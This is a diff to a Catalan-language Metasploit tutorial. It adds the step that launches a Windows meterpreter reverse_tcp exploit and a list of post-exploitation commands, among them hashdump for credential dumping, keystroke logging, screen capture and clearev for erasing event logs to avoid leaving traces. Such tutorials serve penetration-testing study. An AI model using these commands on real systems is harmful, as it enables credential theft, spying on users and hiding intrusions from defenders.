@@ -11,6 +11,23 @@
 
 * i payload `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
 
+* i executem `exploit`
+
 Ja estem dins...
 
-* Comandaments:
+* Comandaments que podem fer servir:
+  * De sitema:
+    * sysinfo
+    * getuid
+    * migrate `pid`
+    * hashdump
+    * upload/download
+    * shell
+    * sysinfo
+  * De Espionatge
+    * keyscan_start/keyscan_dump
+    * screenshot/screenstreamer
+  * Per a no deixar Rastre
+    * clearev
+
+Per supossat hi han prou més... convide a l'usuari a investigar-los, només heu de ficar dins de l'exploit: `help`
